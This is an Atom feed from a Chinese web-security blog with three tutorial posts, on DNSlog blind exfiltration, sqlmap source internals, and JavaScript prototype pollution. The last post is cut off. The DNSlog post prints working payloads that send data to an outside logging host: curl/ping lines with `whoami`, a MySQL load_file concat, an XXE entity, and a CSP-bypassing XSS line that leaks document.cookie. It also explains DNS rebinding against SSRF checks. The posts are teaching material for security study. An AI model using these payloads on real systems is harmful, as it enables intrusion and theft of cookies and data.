<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>白仁的博客</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://bai-ren-1.github.io/"/>
  <updated>2020-03-19T11:34:33.139Z</updated>
  <id>http://bai-ren-1.github.io/</id>
  
  <author>
    <name>白仁</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>计网小复习</title>
    <link href="http://bai-ren-1.github.io/2020/03/19/%E8%AE%A1%E7%BD%91%E5%B0%8F%E5%A4%8D%E4%B9%A0/"/>
    <id>http://bai-ren-1.github.io/2020/03/19/%E8%AE%A1%E7%BD%91%E5%B0%8F%E5%A4%8D%E4%B9%A0/</id>
    <published>2020-03-19T11:34:33.000Z</published>
    <updated>2020-03-19T11:34:33.139Z</updated>
    
    <summary type="html">
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>DNSlog注入</title>
    <link href="http://bai-ren-1.github.io/2020/03/19/DNSlog%E6%B3%A8%E5%85%A5/"/>
    <id>http://bai-ren-1.github.io/2020/03/19/DNSlog%E6%B3%A8%E5%85%A5/</id>
    <published>2020-03-19T07:10:32.000Z</published>
    <updated>2020-03-20T15:05:16.312Z</updated>
    
    <content type="html"><![CDATA[<h1 id="DNSlog注入"><a href="#DNSlog注入" class="headerlink" title="DNSlog注入"></a>DNSlog注入</h1><p>emmm，就写一写DNS log注入吧。有挺多利用方式的，都是为了盲打的效果。只要能在漏洞上通过某些方法<strong>发出一个请求</strong>，就能达成盲打的效果。</p><h2 id="0x00-DNS-log平台"><a href="#0x00-DNS-log平台" class="headerlink" title="0x00 DNS log平台"></a>0x00 DNS log平台</h2><p>这个就详细地介绍一下，首先我们登录到  <a href="http://ceye.io/" target="_blank" rel="noopener">http://ceye.io/</a>  注册并登录，这个是知道创宇建立的一个平台。具体的使用情况说明在里面可以看到详细的解释。随后我们点开个人信息页面，可以看到有个标识符的字段，这是用来标识你这身份的依据：</p><p><img src="/2020/03/19/DNSlog%E6%B3%A8%E5%85%A5/1.png" alt></p><blockquote><p> 对于每个用户，有六个随机字符的唯一标识符代码和唯一子域值，可以在配置文件页面中找到。记录了对该子域及其所有内容的所有DNS查询和HTTP请求。</p><p>例如，<code>b182oj</code>是某人的唯一标识符代码，并且<code>b182oj.ceye.io</code>是他/她的子域。对于所有的DNS quries和HTTP请求<code>b182oj.ceye.io</code>和<code>*.b182oj.ceye.io</code>将被记录。</p></blockquote><p>上面就是关于域名标识的用法解释，很简单明了了，随后我们具体做个简单实验。</p><p>访问<a href="http://dashabi.xxxxx.ceye.io，这里面的DNS解析原理我就不用多说了，不会可以去看计网基础。然后我们就能在查询记录里面看到对应的结果：" target="_blank" rel="noopener">http://dashabi.xxxxx.ceye.io，这里面的DNS解析原理我就不用多说了，不会可以去看计网基础。然后我们就能在查询记录里面看到对应的结果：</a></p><p><img src="/2020/03/19/DNSlog%E6%B3%A8%E5%85%A5/3.png" alt></p><p>除了DNS查询记录里面的记录，平台还提供了http查询查询功能：</p><p><img src="/2020/03/19/DNSlog%E6%B3%A8%E5%85%A5/4.png" alt></p><p>可以看到我们发出了两个http请求，分别请求了网站和网站图标。初步实验结束，平台强大，进入使用。</p><h2 id="0x01-SQL盲注"><a href="#0x01-SQL盲注" class="headerlink" title="0x01 SQL盲注"></a>0x01 SQL盲注</h2><p>如遇到MySql的盲注时，可以利用内置函数<code>load_file()</code>来完成DNSLOG。<strong>load_file()</strong>不仅能够加载本地文件，同时也能对诸如<code>\\www.test.com</code>这样的URL<strong>发起请求</strong>。 </p><p><img src="/2020/03/19/DNSlog%E6%B3%A8%E5%85%A5/5.png" alt></p><p>基本的表信息结构如上图所示。我们使用DNS log注入需要用到一个重要参数：<code>secure_file_priv</code></p><p><img src="/2020/03/19/DNSlog%E6%B3%A8%E5%85%A5/6.png" alt></p><blockquote><p>当secure_file_priv为空，就可以读取磁盘的目录。</p><p>当secure_file_priv为G:\，就可以读取G盘的文件。</p><p>当secure_file_priv为null，load_file就不能加载文件。</p><p>具体的配置在 my.ini 中可以进行设置</p></blockquote><p>我将secure_file_priv修改为空，然后可以进入正题了，我们通过下面这种payload：</p><p><img src="/2020/03/19/DNSlog%E6%B3%A8%E5%85%A5/9.png" alt></p><blockquote><p>经实验前面不是四个反斜杠会无法得到请求，并且后面不加uri也会得不到请求；</p><p>有选中数据库，但命令行下发不出请求，用sqlyog就能成功发出；</p></blockquote><p><img src="/2020/03/19/DNSlog%E6%B3%A8%E5%85%A5/10.png" alt></p><blockquote><p>我们通过load_file发出请求，请求的内容用concat进行拼接：前面四个反斜杠是为了转义成两个斜杠，然后拼上数据库查询，后面就是DNSlog的域名。</p></blockquote><p>相应的我们把想查询的内容放在对应位置即可。</p><h2 id="0x01-无回显命令执行"><a href="#0x01-无回显命令执行" class="headerlink" title="0x01 无回显命令执行"></a>0x01 无回显命令执行</h2><p>命令执行可以通过搭配<strong>curl或者ping发出请求</strong>命令来达成无回显获取信息的目的。</p><p>LINUX平台下payload的形式：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl http://ip.port.b182oj.ceye.io/`whoami`</span><br><span class="line">ping `whoami`.ip.port.b182oj.ceye.io</span><br></pre></td></tr></table></figure><p>Windows平台下payload的形式：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping %USERNAME%.b182oj.ceye.io</span><br></pre></td></tr></table></figure><p>附上Windows平台下重要变量的值：</p><table><thead><tr><th>变量</th><th>类型</th><th>描述</th></tr></thead><tbody><tr><td>%ALLUSERSPROFILE%</td><td>本地</td><td>返回“所有用户”配置文件的位置。</td></tr><tr><td>%APPDATA%</td><td>本地</td><td>返回默认情况下应用程序存储数据的位置。</td></tr><tr><td>%CD%</td><td>本地</td><td>返回当前目录字符串。</td></tr><tr><td>%CMDCMDLINE%</td><td>本地</td><td>返回用来启动当前的 Cmd.exe 的准确命令行。</td></tr><tr><td>%CMDEXTVERSION%</td><td>系统</td><td>返回当前的“命令处理程序扩展”的版本号。</td></tr><tr><td>%COMPUTERNAME%</td><td>系统</td><td>返回计算机的名称。</td></tr><tr><td>%COMSPEC%</td><td>系统</td><td>返回命令行解释器可执行程序的准确路径。</td></tr><tr><td>%DATE%</td><td>系统</td><td>返回当前日期。使用与 date /t 命令相同的格式。由 Cmd.exe 生成。有关 date 命令的详细信息，请参阅 Date。</td></tr><tr><td>%ERRORLEVEL%</td><td>系统</td><td>返回上一条命令的错误代码。通常用非零值表示错误。</td></tr><tr><td>%HOMEDRIVE%</td><td>系统</td><td>返回连接到用户主目录的本地工作站驱动器号。基于主目录值而设置。用户主目录是在“本地用户和组”中指定的。</td></tr><tr><td>%HOMEPATH%</td><td>系统</td><td>返回用户主目录的完整路径。基于主目录值而设置。用户主目录是在“本地用户和组”中指定的。</td></tr><tr><td>%HOMESHARE%</td><td>系统</td><td>返回用户的共享主目录的网络路径。基于主目录值而设置。用户主目录是在“本地用户和组”中指定的。</td></tr><tr><td>%LOGONSERVER%</td><td>本地</td><td>返回验证当前登录会话的域控制器的名称。</td></tr><tr><td>%NUMBER_OF_PROCESSORS%</td><td>系统</td><td>指定安装在计算机上的处理器的数目。</td></tr><tr><td>%OS%</td><td>系统</td><td>返回操作系统名称。Windows 2000 显示其操作系统为 Windows_NT。</td></tr><tr><td>%PATH%</td><td>系统</td><td>指定可执行文件的搜索路径。</td></tr><tr><td>%PATHEXT%</td><td>系统</td><td>返回操作系统认为可执行的文件扩展名的列表。</td></tr><tr><td>%PROCESSOR_ARCHITECTURE%</td><td>系统</td><td>返回处理器的芯片体系结构。值：x86 或 IA64（基于 Itanium）。</td></tr><tr><td>%PROCESSOR_IDENTFIER%</td><td>系统</td><td>返回处理器说明。</td></tr><tr><td>%PROCESSOR_LEVEL%</td><td>系统</td><td>返回计算机上安装的处理器的型号。</td></tr><tr><td>%PROCESSOR_REVISION%</td><td>系统</td><td>返回处理器的版本号。</td></tr><tr><td>%PROMPT%</td><td>本地</td><td>返回当前解释程序的命令提示符设置。由 Cmd.exe 生成。</td></tr><tr><td>%RANDOM%</td><td>系统</td><td>返回 0 到 32767 之间的任意十进制数字。由 Cmd.exe 生成。</td></tr><tr><td>%SYSTEMDRIVE%</td><td>系统</td><td>返回包含 Windows server operating system 根目录（即系统根目录）的驱动器。</td></tr><tr><td>%SYSTEMROOT%</td><td>系统</td><td>返回 Windows server operating system 根目录的位置。</td></tr><tr><td>%TEMP%和%TMP%</td><td>系统和用户</td><td>返回对当前登录用户可用的应用程序所使用的默认临时目录。有些应用程序需要 TEMP，而其他应用程序则需要 TMP。</td></tr><tr><td>%TIME%</td><td>系统</td><td>返回当前时间。使用与time /t命令相同的格式。由Cmd.exe生成。有关time命令的详细信息，请参阅 Time。</td></tr><tr><td>%USERDOMAIN%</td><td>本地</td><td>返回包含用户帐户的域的名称。</td></tr><tr><td>%USERNAME%</td><td>本地</td><td>返回当前登录的用户的名称。</td></tr><tr><td>%USERPROFILE%</td><td>本地</td><td>返回当前用户的配置文件的位置。</td></tr><tr><td>%WINDIR%</td><td>系统</td><td>返回操作系统目录的位置。</td></tr></tbody></table><p>做个简单的实验，通过ping命令查询拼接了%USERNAME%的域名，就能通过命令执行获取到主机的用户名信息：</p><p><img src="/2020/03/19/DNSlog%E6%B3%A8%E5%85%A5/11.png" alt></p><p>在平台上就能接收到结果了：</p><p><img src="/2020/03/19/DNSlog%E6%B3%A8%E5%85%A5/12.png" alt></p><h2 id="0x02-XXE盲打"><a href="#0x02-XXE盲打" class="headerlink" title="0x02 XXE盲打"></a>0x02 XXE盲打</h2><p>直接上payload：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE root [</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % remote SYSTEM "http://ip.port.b182oj.ceye.io/xxe_test"&gt;</span></span><br><span class="line"><span class="meta">%remote;]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>/&gt;</span></span><br></pre></td></tr></table></figure><h2 id="0x03-绕CSP打XSS拿cookie"><a href="#0x03-绕CSP打XSS拿cookie" class="headerlink" title="0x03 绕CSP打XSS拿cookie"></a>0x03 绕CSP打XSS拿cookie</h2><p>CSP(内容安全策略)是防御XSS最有效的手段之一。当我们发现一个网站有XSS漏洞，想利用XSS平台来打Cookie时，CSP会通过白名单的方式，禁止跨域加载脚本，恶意代码便会因此被阻挡在门外，导致此XSS无法利用。对此，我们可以使用DNS预解析突破CSP的阻拦。 </p><blockquote><p> DNS预解析(DNS Prefetching)是一种能够加快网页加载速度的技术，对于跨站的链接，由于每次都要进行一次DNS解析，会消耗掉很多时间。DNS预解析在浏览器空闲时，将跨站资源的域名转化为IP 地址并缓存，真正请求资源时就避免了解析的时间。 </p></blockquote><p>DNS预解析是默认开启的，并且我们可以通过<code>rel=&quot;dns-prefetch&quot;</code>来强制进行DNS预解析。由于<strong>DNS预解析可以绕过CSP进行解析</strong>，结合DNSLOG，我们即可窃取在CSP保护下的Cookie。 </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document.querySelector('body').innerHTML += "<span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">'dns-prefetch'</span> <span class="attr">href</span>=<span class="string">'" + window.btoa(document.cookie.split(/;|=/)[1]) + ".b182oj.ceye.io'</span>&gt;</span>"</span><br></pre></td></tr></table></figure><blockquote><p> document.querySelector(‘body’)获取文档中 “body” 的元素然后 += 添加上DNS预解析标签；</p><p>预解析标签指向的地址是分割符号后出来的并经过window.btoa进行b64编码的cookie作为二级域名的域名；</p></blockquote><p>上面的Payload将Cookie中截取的重要字段进行简单的base64编码后，作为我们DNSLOG平台的二级域名，并在body中插入了相应的link标签对此域名进行强制DNS预解析。当触发XSS攻击时，可以在Web控制台下看到结 </p><h2 id="0x04-DNS解绑定绕SSRF"><a href="#0x04-DNS解绑定绕SSRF" class="headerlink" title="0x04 DNS解绑定绕SSRF"></a>0x04 DNS解绑定绕SSRF</h2><p>SSRF解绑定攻击流程：</p><p><img src="/2020/03/19/DNSlog%E6%B3%A8%E5%85%A5/13.png" alt></p><ul><li>服务器端获得URL参数，进行第一次DNS解析，获得了一个非内网的IP。</li><li>对于获得的IP进行判断，发现为非黑名单IP，则通过验证。</li><li>服务器端对于URL进行访问，由于DNS服务器设置的TTL为0，所以再次进行DNS解析，这一次DNS服务器返回的是内网地址。</li></ul><blockquote><p>攻击点就在于<strong>第二次</strong>服务端发出请求时，我们能通过短时间的ttl来修改返回的地址。因为验证的操作是在第一步那里，那一步我们可以返回不是内网的地址，所以我们能绕过验证。绕过后服务器要请求页面了，这次我们给他响应一个内网地址，所以就能利用ssrf了。</p></blockquote><ul><li>由于已经绕过验证，所以服务器端返回访问内网资源的结果。</li></ul><h2 id="0x05-小结"><a href="#0x05-小结" class="headerlink" title="0x05 小结"></a>0x05 小结</h2><p>DNSlog真的是一个好用的东西，各种无回显漏洞通过搭配发出请求域名的命令就能通过log形式来看到回显的结果。要好好的利用总结。</p><p>参考链接：</p><p> <a href="https://www.freebuf.com/articles/web/135342.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/135342.html</a> </p><p> <a href="https://www.freebuf.com/column/184587.html" target="_blank" rel="noopener">https://www.freebuf.com/column/184587.html</a> </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;DNSlog注入&quot;&gt;&lt;a href=&quot;#DNSlog注入&quot; class=&quot;headerlink&quot; title=&quot;DNSlog注入&quot;&gt;&lt;/a&gt;DNSlog注入&lt;/h1&gt;&lt;p&gt;emmm，就写一写DNS log注入吧。有挺多利用方式的，都是为了盲打的效果。只要能在漏洞上
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://bai-ren-1.github.io/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>Sqlmap源码分析</title>
    <link href="http://bai-ren-1.github.io/2020/03/18/Sqlmap%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"/>
    <id>http://bai-ren-1.github.io/2020/03/18/Sqlmap%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/</id>
    <published>2020-03-18T06:05:37.000Z</published>
    <updated>2020-03-18T07:47:07.669Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Sqlmap源码分析"><a href="#Sqlmap源码分析" class="headerlink" title="Sqlmap源码分析"></a>Sqlmap源码分析</h1><p>实验室面试经典面题，既然科班出身，肯定得好好钻研一下这些工具源码然后自己写或者拓展。</p><h2 id="0x00-环境搭建"><a href="#0x00-环境搭建" class="headerlink" title="0x00 环境搭建"></a>0x00 环境搭建</h2><p>环境没啥好说的，直接拿自己刚入门时下载的Sqlmap和VSCode一把梭。</p><h2 id="0x01-源码分析"><a href="#0x01-源码分析" class="headerlink" title="0x01 源码分析"></a>0x01 源码分析</h2><h3 id="1-入口定位"><a href="#1-入口定位" class="headerlink" title="1) 入口定位"></a>1) 入口定位</h3><p>因为我们使用Sqlmap都是用python指定执行sqlmap.py这个文件，所以没啥好说的，就是从他开始分析。</p><p>直接定位到他的入口函数。可以看到他用异常处理模块写的，那就直接跟进try模块，分析他的调用情况。</p><p><img src="/2020/03/18/Sqlmap%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/1.png" alt></p><p>emmm，确实写的太具体了，在主方法中还定义了各种异常处理模块。看名称大概就是Sqlmap用户退出异常、Sqlmap的shell异常、Sqlmap基本异常、键盘输入异常和EOF等，暂时先不看吧。看他的主模块我们继续跟进主方法里面的try模块：</p><p><img src="/2020/03/18/Sqlmap%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/2.png" alt></p><p>进到try模块一看就舒服多了，我把最下面的if模块收起来，整个try模块就和清晰明了。很明显一进入了try就执行了这四个处理函数，并且下面的多次使用了 cmdLineOptions、conf变量。</p><h3 id><a href="#" class="headerlink" title></a><img src="/2020/03/18/Sqlmap%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/3.png" alt></h3><h3 id="2-函数分析"><a href="#2-函数分析" class="headerlink" title="2) 函数分析"></a>2) 函数分析</h3><h4 id="1-dirtyPatches"><a href="#1-dirtyPatches" class="headerlink" title="1. dirtyPatches"></a>1. dirtyPatches</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dirtyPatches</span><span class="params">()</span>:</span></span><br><span class="line">  <span class="string">"""</span></span><br><span class="line"><span class="string">  Place for "dirty" Python related patches</span></span><br><span class="line"><span class="string">  """</span></span><br><span class="line">  <span class="comment"># accept overly long result lines (e.g. SQLi results in HTTP header responses)</span></span><br><span class="line">  httplib._MAXLINE = <span class="number">1</span> * <span class="number">1024</span> * <span class="number">1024</span></span><br><span class="line">  <span class="comment"># add support for inet_pton() on Windows OS</span></span><br><span class="line">  <span class="keyword">if</span> IS_WIN:</span><br><span class="line"><span class="keyword">from</span> thirdparty.wininetpton <span class="keyword">import</span> win_inet_pton</span><br><span class="line">  <span class="comment"># Reference: https://github.com/nodejs/node/issues/12786#issuecomment-298652440</span></span><br><span class="line">  codecs.register(<span class="keyword">lambda</span> name: codecs.lookup(<span class="string">"utf-8"</span>) <span class="keyword">if</span> name == <span class="string">"cp65001"</span> <span class="keyword">else</span> <span class="literal">None</span>)</span><br></pre></td></tr></table></figure><p>这个函数很明显是在做一些声明和初始化操作：</p><ul><li>声明了httplib的最大值MAXLINE的值</li><li>如果是Windows系统则导入ip地址转换函数模块</li><li>如果字符编码是cp65001则转换为utf-8 </li></ul><blockquote><p>当然这里有个好玩的地方就是他的转换是通过写lambda表达式写的：</p><p>lambda作为一个表达式，定义了一个匿名函数，上例的代码name为参数，name为cp65001则转utf-8 </p></blockquote><h4 id="2-checkEnvironment"><a href="#2-checkEnvironment" class="headerlink" title="2. checkEnvironment"></a>2. checkEnvironment</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">checkEnvironment</span><span class="params">()</span>:</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">os.path.isdir(modulePath())</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">except</span> UnicodeEncodeError:</span><br><span class="line">errMsg = <span class="string">"your system does not properly handle non-ASCII paths. "</span></span><br><span class="line">errMsg += <span class="string">"Please move the sqlmap's directory to the other location"</span></span><br><span class="line">logger.critical(errMsg)</span><br><span class="line"><span class="keyword">raise</span> SystemExit</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> distutils.version.LooseVersion(VERSION) &lt; distutils.version.LooseVersion(<span class="string">"1.0"</span>):</span><br><span class="line">errMsg = <span class="string">"your runtime environment (e.g. PYTHONPATH) is "</span></span><br><span class="line">errMsg += <span class="string">"broken. Please make sure that you are not running "</span></span><br><span class="line">errMsg += <span class="string">"newer versions of sqlmap with runtime scripts for older "</span></span><br><span class="line">errMsg += <span class="string">"versions"</span></span><br><span class="line">logger.critical(errMsg)</span><br><span class="line"><span class="keyword">raise</span> SystemExit</span><br><span class="line"></span><br><span class="line"><span class="comment"># Patch for pip (import) environment</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">"sqlmap.sqlmap"</span> <span class="keyword">in</span> sys.modules:</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> (<span class="string">"cmdLineOptions"</span>, <span class="string">"conf"</span>, <span class="string">"kb"</span>):</span><br><span class="line">globals()[_] = getattr(sys.modules[<span class="string">"lib.core.data"</span>], _)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> (<span class="string">"SqlmapBaseException"</span>, <span class="string">"SqlmapShellQuitException"</span>, <span class="string">"SqlmapSilentQuitException"</span>, <span class="string">"SqlmapUserQuitException"</span>):</span><br><span class="line">globals()[_] = getattr(sys.modules[<span class="string">"lib.core.exception"</span>], _)</span><br></pre></td></tr></table></figure><p>很贴切函数名，这里就是在做一些环境的检查操作：</p><ul><li>检查模块的路径是否可以找到，拒绝奇怪的编码</li><li>检查python的版本，太老就gg了</li><li>从lib.core.data中导入三个全局变量 <code>conf、kb、cmdLineOptions</code>，有点意思了</li><li>从lib.core.exception中导入几个异常处理类</li></ul><h4 id="3-setPaths"><a href="#3-setPaths" class="headerlink" title="3. setPaths"></a>3. setPaths</h4><p><img src="/2020/03/18/Sqlmap%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/4.png" alt></p><p>这个函数太长啦，下面还有部分函数，我没截图。大概功能也很明显：就是把各类资源路径加载进去。</p><h4 id="4-banner"><a href="#4-banner" class="headerlink" title="4. banner"></a>4. banner</h4><p>banner信息，没啥好说的，下面继续。</p><h3 id="3-跟进initOptions"><a href="#3-跟进initOptions" class="headerlink" title="3) 跟进initOptions"></a>3) 跟进initOptions</h3><p><img src="/2020/03/18/Sqlmap%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/5.png" alt></p><p>其中setConfAttributes（配置属性）设置了conf的属性：</p><p><img src="/2020/03/18/Sqlmap%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/6.png" alt></p><p>第二个setKnowledgeBaseAttributes（知识库属性）设置了kb的属性：</p><p><img src="/2020/03/18/Sqlmap%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/7.png" alt></p><p>第三个不说了。这个总的函数initOptions意义在于设置了conf和kb这两个经常会遇到的全局变量的属性，我们可以在这里快速定位到相关信息。下面继续跟进main中的try模块。</p><h3 id="4-初见曙光"><a href="#4-初见曙光" class="headerlink" title="4) 初见曙光"></a>4) 初见曙光</h3><p>继续在try模块跟踪，现在可以展开if模块了（终于），很清晰的看到在init初始化后就开始进入主程序中：</p><p><img src="/2020/03/18/Sqlmap%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/8.png" alt></p><p>跟进下init发现都是初始操作，这里就不写了。然后他会调用两种测试：smokeTest和liveTest对Sqlmap的功能进行测试。</p><p>测试完就会导入start方法了，终于看到曙光了。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Sqlmap源码分析&quot;&gt;&lt;a href=&quot;#Sqlmap源码分析&quot; class=&quot;headerlink&quot; title=&quot;Sqlmap源码分析&quot;&gt;&lt;/a&gt;Sqlmap源码分析&lt;/h1&gt;&lt;p&gt;实验室面试经典面题，既然科班出身，肯定得好好钻研一下这些工具源码然后自己写或
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://bai-ren-1.github.io/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>JS原型污染链</title>
    <link href="http://bai-ren-1.github.io/2020/03/17/JS%E5%8E%9F%E5%9E%8B%E6%B1%A1%E6%9F%93%E9%93%BE/"/>
    <id>http://bai-ren-1.github.io/2020/03/17/JS%E5%8E%9F%E5%9E%8B%E6%B1%A1%E6%9F%93%E9%93%BE/</id>
    <published>2020-03-17T06:08:27.000Z</published>
    <updated>2020-03-20T15:16:31.893Z</updated>
    
    <content type="html"><![CDATA[<h1 id="JS原型污染链"><a href="#JS原型污染链" class="headerlink" title="JS原型污染链"></a>JS原型污染链</h1><p>JS中一种很有意思的漏洞，利用了JS中原型的特性，特此记录。</p><p>在正式进入之前先说一下chrome下如何清除console下面的历史记录。首先固定住console，然后ctrl+shift+j组合键再调出另一个console，随后选中application并清理里面local storge。随后关闭console并刷新即可。</p><h2 id="0x00-类的声明"><a href="#0x00-类的声明" class="headerlink" title="0x00 类的声明"></a>0x00 类的声明</h2><p>JS在ECS6之前没有类的概念，之前的类都是用funtion来声明的 。</p><p><img src="/2020/03/17/JS%E5%8E%9F%E5%9E%8B%E6%B1%A1%E6%9F%93%E9%93%BE/3.png" alt></p><p>由上图可以看到，我先定义了一个Shabi类，并且类中具有属性name。随后实例化一个对象shabi，可以看到对象shabi中也具有了类Shabi中的属性a。</p><blockquote><p>通过new实例化对象即是通过构造方法来实例化对象。</p></blockquote><p>当然我们也能这么来写，定义了TestShabi类并实例化testshabi对象：</p><p><img src="/2020/03/17/JS%E5%8E%9F%E5%9E%8B%E6%B1%A1%E6%9F%93%E9%93%BE/2.png" alt></p><p>同样也能在对象中得到类中的属性，出现这个情况的原因是JS的继承特性，与之相关的就涉及到了原型链。</p><h2 id="0x01-原型链"><a href="#0x01-原型链" class="headerlink" title="0x01 原型链"></a>0x01 原型链</h2><p><img src="/2020/03/17/JS%E5%8E%9F%E5%9E%8B%E6%B1%A1%E6%9F%93%E9%93%BE/1.png" alt></p><p>根据上面的图，我们就能知道了类、对象、原型对象、原型类等基本概念和关系，下面通过做一个实验来验证。</p><h2 id="0x02-实验探究"><a href="#0x02-实验探究" class="headerlink" title="0x02 实验探究"></a>0x02 实验探究</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在JS中只有类才有prototype属性，而对象却没有，对象有的是__proto__，它和类的prototype对应。且二者是等价的，都指向了对应的原型对象。</span><br></pre></td></tr></table></figure><p>根据上面的原型链的原理图，我声明了A类，然后实例化一个对象a。在类中有一个属性prototype，在实例化对象中有个属性<code>__proto__</code>，他们都指向了A的原型对象：</p><p><img src="/2020/03/17/JS%E5%8E%9F%E5%9E%8B%E6%B1%A1%E6%9F%93%E9%93%BE/4.png" alt></p><blockquote><p>原型对象是个对象，上例即为A.prototype，具体内容{constructor:f}，该原型对象只有一个构造方法。</p></blockquote><p>随后我们跟进这个原型对象A.prototype，因为他是一个原型对象（即对象类型），于是他也会具有他的原型对象即<code>A.prototype.__proto__</code>。我们直接点开属性列表，就可以看到他的原型对象（原型对象A.protype的原型对象，对应上图中的Object.prototype）：</p><p><img src="/2020/03/17/JS%E5%8E%9F%E5%9E%8B%E6%B1%A1%E6%9F%93%E9%93%BE/6.png" alt></p><p>我们也可以通过这样来验证：</p><p><img src="/2020/03/17/JS%E5%8E%9F%E5%9E%8B%E6%B1%A1%E6%9F%93%E9%93%BE/5.png" alt></p><p>最后我们看Object.prototype可以看到它的原型对象为空，至此整条原型链完毕：</p><p><img src="/2020/03/17/JS%E5%8E%9F%E5%9E%8B%E6%B1%A1%E6%9F%93%E9%93%BE/7.png" alt></p><blockquote><p>原型链 ：a -&gt; A.prototype -&gt; Object.protype -&gt; null</p></blockquote><h2 id="0x03-原型链污染"><a href="#0x03-原型链污染" class="headerlink" title="0x03 原型链污染"></a>0x03 原型链污染</h2><h3 id="1-属性污染"><a href="#1-属性污染" class="headerlink" title="1) 属性污染"></a>1) 属性污染</h3><p><img src="/2020/03/17/JS%E5%8E%9F%E5%9E%8B%E6%B1%A1%E6%9F%93%E9%93%BE/8.png" alt></p><p>上图就是一个简单的对原型链进行属性的污染。首先我们定义一个shabi类，它里面没有属性。然后我们实例化一个a对象，可以看到他是一个空对象。</p><p>那如果我们对a的原型对象进行操作呢？上面我给a的原型对象加了一个name属性，并赋值。可以看到，在“污染”了原型对象后，我再重新实例化b对象。虽然b对象也是空对象，但是因为原型链和被“污染”的原型对象的存在，它可以输出name属性。至此，就是一个简单的原型链污染，控制了b对象的name属性。</p><h3 id="2-函数污染"><a href="#2-函数污染" class="headerlink" title="2) 函数污染"></a>2) 函数污染</h3><p>首先看一下JS中的继承。我先定义了一个Shabi作为父类，其中具有方法能输出字符串。随后我定义一个空子类ShabiSon。通过prototype让子类继承父类。此时我实例化一个sona对象，可以看到它因为具有了父类的方法。</p><p><img src="/2020/03/17/JS%E5%8E%9F%E5%9E%8B%E6%B1%A1%E6%9F%93%E9%93%BE/9.png" alt></p><p>那我们就开始操作，给他进行方法的“污染”。实例化对象儿子a即sona很生气，想让其他儿子也变笨。于是我们通过sona对象的<code>__proto__</code>属性指向了父类Shabi，并改写其中的ShowName方法。</p><p><img src="/2020/03/17/JS%E5%8E%9F%E5%9E%8B%E6%B1%A1%E6%9F%93%E9%93%BE/10.png" alt></p><p>可以看到，我们通过改写父类的方法，成功让其他继承了父类的聪明的宝宝变成了shabi。</p><h2 id="0x04-CTF利用"><a href="#0x04-CTF利用" class="headerlink" title="0x04 CTF利用"></a>0x04 CTF利用</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 